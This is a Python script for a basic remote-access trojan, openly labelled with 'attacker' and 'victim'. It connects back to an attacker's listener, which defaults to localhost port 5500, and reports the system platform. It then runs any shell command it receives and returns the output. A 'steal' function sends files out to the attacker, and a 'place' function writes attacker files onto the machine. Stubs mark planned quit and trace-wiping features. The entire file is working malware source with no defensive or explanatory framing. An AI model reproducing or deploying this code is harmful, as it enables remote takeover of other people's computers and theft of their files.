from socket import socket, AF_INET, SOCK_STREAM
from platform import platform
import subprocess
from time import sleep
from sys import argv


# opens a file and sends it to attacker 
# in chunks of 1024 bytes
def steal(sock, path):
	path = path.split(" ")[0]
	try:
		file = open(path, "rb")
		f = file.read(1024)
		while f:
			sock.send(f)
			f = file.read(1024)
		file.close()
		sleep(0.2)
		sock.send("end".encode())
	except:
		pass

# receives a file form attacker and
# places it on the victims machine
def place(sock, path):
	path = path.split(" ")[1]
	end = "end".encode()
	file = open(path, "wb")

	f = sock.recv(1024)
	while f != end:	
		file.write(f)
		f = sock.recv(1024)

	file.close()	
	

# connects to the attacker
# returns a socket
def connect(host, port):
	sock = socket(AF_INET, SOCK_STREAM)
	sock.connect((host, port))
	return sock


# parses the received command
# returns two values: the action to be done
# and the parameter
def parseCommand(raw):
	command = raw.split(" ")
	action = command[0]
	del command[0]
	parameter = " ".join(command)
	return action, parameter


def main():

	host = "localhost"
	
	if len(argv) > 1:
		try:
			port = int(argv[1])
		except:
			port = 5500
	else:
		port = 5500

	info = ("System: " + platform()).encode()
	sock = connect(host, port)
	sock.send(info)


	while sock:
		raw = sock.recv(1024).decode()
		action, parameter = parseCommand(raw)


		if action == "quit":
			# TODO: quit the programm
			pass
		elif action == "wipe":
			# TODO: wipe all traces of software
			pass
		elif action == "system":
			try:
				proc = subprocess.Popen(parameter, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
				stdout_value = proc.stdout.read() + proc.stderr.read()
				if stdout_value:
					sock.send(stdout_value)
				else:
					sock.send(b' ')
			except:
				print("error")
				pass
			
		elif action == "steal":
			steal(sock, parameter)
			pass
		elif action == "place":
			place(sock, parameter)
			pass
		else:
			sock.send(b"Invalid command")

main()